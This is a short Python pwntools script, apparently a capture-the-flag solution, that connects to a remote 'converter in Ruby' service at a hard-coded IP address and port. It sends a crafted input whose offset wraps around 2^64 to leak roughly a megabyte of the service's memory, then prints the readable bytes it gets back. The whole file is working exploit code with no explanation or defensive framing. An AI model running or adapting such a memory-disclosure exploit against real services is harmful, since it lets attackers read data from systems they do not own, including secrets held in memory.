from __future__ import print_function
from pwn import *
from Crypto.Util.number import long_to_bytes

r = connect("110.10.147.105", 12137)

r.recvuntil("to exit\n")

max = 1 << 64
leak = 1024*1024
s = "@" + str(max - leak) + "C" + str(leak)
r.sendline(s)
r.recvuntil("2. hex\n")
r.sendline("1")
r.readline()
m = r.recvuntil("[CONVERTER IN RUBY]")
m = m.split("\n")[:-1]
print (len(m))
for l in m:
	try:
		c = long(l)
		if c > 31 and c < 127: print (chr(c), end='')
	except:
		pass
